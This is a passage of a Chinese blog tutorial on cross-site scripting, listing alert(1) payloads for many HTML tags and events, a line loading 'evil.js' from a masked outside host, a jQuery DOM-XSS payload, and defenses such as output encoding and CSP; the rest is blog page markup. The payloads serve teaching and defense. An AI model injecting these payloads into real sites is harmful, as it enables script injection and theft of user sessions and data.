+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>details ontoggle<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>details open ontoggle<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p><code>&lt;svg&gt;</code> 标签用来在HTML页面中直接嵌入SVG 文件的代码。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>svg onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p><code>&lt;select&gt;</code> 标签用来创建下拉列表。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>select onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span>
+</code></pre>
+<p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>select onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> autofocus<span class="token operator">></span>
+</code></pre>
+<h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p><code>&lt;iframe&gt;</code> 标签会创建包含另外一个文档的内联框架。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>iframe onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span>
+</code></pre>
+<h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p><code>&lt;video&gt;</code> 标签定义视频，比如电影片段或其他视频流。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>video<span class="token operator">></span><span class="token operator">&lt;</span>source onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
+</code></pre>
+<h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>audio src<span class="token operator">=</span>x  onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p><code>&lt;body&gt;</code> 标签定义文档的主体。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
+</code></pre>
+<p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>bodyonscroll<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>br<span class="token operator">></span><span class="token operator">&lt;</span>input autofocus<span class="token operator">></span>
+</code></pre>
+<h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p><code>&lt;textarea&gt;</code> 标签定义一个多行的文本输入控件。</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>textarea onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> autofocus<span class="token operator">></span>
+</code></pre>
+<h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>keygen autofocus onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token comment" spellcheck="true">//仅限火狐</span>
+</code></pre>
+<h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>marquee onstart<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>marquee<span class="token operator">></span> <span class="token comment" spellcheck="true">//Chrome不行，火狐和IE都可以</span>
+</code></pre>
+<h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p><code>&lt;link&gt;</code> 标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token keyword">import</span> href<span class="token operator">=</span><span class="token string">"http://47.xxx.xxx.72/evil.js"</span><span class="token operator">></span>
+</code></pre>
+<h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote>
+<p>和前文说的一样，各种 js 中捣鼓</p>
+</blockquote>
+<h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p>
+<img src="/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/JQueryCode.png" class="">
+
+<p>若为进行任意过滤的时候 Payload</p>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span>
+</code></pre>
+<h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p>
+<h2 id="0x06-XSS-的实战应用"><a href="#0x06-XSS-的实战应用" class="headerlink" title="0x06 XSS 的实战应用"></a>0x06 XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a target="_blank" rel="noopener" href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p>
+<h2 id="0x07-CSRF-和-XSS-的区别"><a href="#0x07-CSRF-和-XSS-的区别" class="headerlink" title="0x07 CSRF 和 XSS 的区别"></a>0x07 CSRF 和 XSS 的区别</h2><p>1、CSRF是跨站请求伪造;  XSS是跨域脚本攻击。<br>2、CSRF需要用户先登录网站A,获取cookie;  XSS不需要登录。<br>3、CSRF是利用网站A本身的漏洞,去请求网站A的api;  XSS是向网站A注入JS代码,然后执行JS里的代码,篡改网站A的内容。（XSS利用的是站点内的信任用户，而CSRF则是通过伪装来自受信任用户的请求来利用受信任的网站。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p>
+<h2 id="0x08-XSS-的防御"><a href="#0x08-XSS-的防御" class="headerlink" title="0x08 XSS 的防御"></a>0x08 XSS 的防御</h2><ul>
+<li>主要是两层：<br> 一： 对输出端的数据进行编码<br> 二:  验证输入</li>
+</ul>
+<p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p>
+<h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些字符进行转义，例如 <code>&lt;</code>，<code>&gt;</code> 进行转义<br>2）白名单，通过一些标签限制<br>3）不要把后端传进来的数据直接作为 HTML 渲染，进行处理</p>
+<h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
+<ul>
+<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
+<li>禁止内联脚本执行。</li>
+<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
+</ul>
+<h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul>
+<li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
+<li>验证码：防止脚本冒充用户提交危险操作。</li>
+</ul>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Drun1baby</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://drun1baby.github.io/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/">https://drun1baby.github.io/2022/05/05/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XSS/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Drun1baby</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va',
+        appKey: 'ermlV1eoB1YODT088EdXjo6C',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/05/06/HackTheBox-Under-Construction/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="HackTheBox-Under-Construction">
+                        
+                        <span class="card-title">HackTheBox-Under-Construction</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            本篇文章进行了加密，若需查看请输入密码
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-05-06
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/HTB/" class="post-category">
+                                    HTB
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="WebGoat代码审计-07-XSS">
+                        
+                        <span class="card-title">WebGoat代码审计-07-XSS</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            WebGoat代码审计-07-XSS
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-05-05
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
+                                    代码审计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">代码审计</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('3000')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: 芜风<br />'
+            + '文章作者: Drun1baby<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
